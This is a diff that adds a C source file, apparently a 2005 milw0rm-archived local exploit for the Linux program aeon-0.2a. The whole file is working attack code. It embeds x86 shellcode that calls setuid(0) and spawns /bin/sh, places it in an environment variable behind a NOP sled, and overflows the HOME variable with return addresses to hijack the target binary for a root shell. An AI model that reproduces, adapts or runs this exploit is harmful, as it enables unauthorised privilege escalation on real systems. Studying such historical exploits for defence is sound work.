@@ -1,0 +1,51 @@
+/* first release /str0ke */
+/*
+local linux exploit within aeon-0.2a
+Coded by patr0n (security-tmp.h14.ru)
+*/
+
+
+#define BUFLEN 533
+#define PATH "/home/research/aeon-0.2a/aeon"
+
+char shellcode[]=
+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
+"\xb0\x2e\xcd\x80\xeb\x15\x5b\x31"
+"\xc0\x88\x43\x07\x89\x5b\x08\x89"
+"\x43\x0c\x8d\x4b\x08\x31\xd2\xb0"
+"\x0b\xcd\x80\xe8\xe6\xff\xff\xff"
+"/bin/sh";
+
+int main(int argc, char *argv[]) {
+
+        char evilbuf[BUFLEN];
+        int i;
+        char *p,*av[2], *ev[3];
+        char *egg;
+
+        egg=(char *)malloc(1000);
+        sprintf(egg, "EGG=");
+        memset(egg + 4, 0x90, 1000-1-strlen(shellcode));
+        sprintf(egg + 4 + 1000-1-strlen(shellcode), "%s", shellcode);
+	
+	long ret=0xbfffffff-5-strlen(egg)-strlen(PATH);
+
+        p=evilbuf;
+        bzero(evilbuf,sizeof(evilbuf));
+	strcpy(evilbuf,"HOME=");
+		
+        for(i=5;i<=BUFLEN;i+=4) 
+	    *(long *)(p+i)=ret; 
+	
+        av[0] = PATH;
+        av[1] = 0;
+        ev[0] = egg;
+	ev[1] = evilbuf;
+        ev[2] = 0;
+        execve(*av, av, ev);
+
+        return 0;
+
+}
+
+// milw0rm.com [2005-04-05]
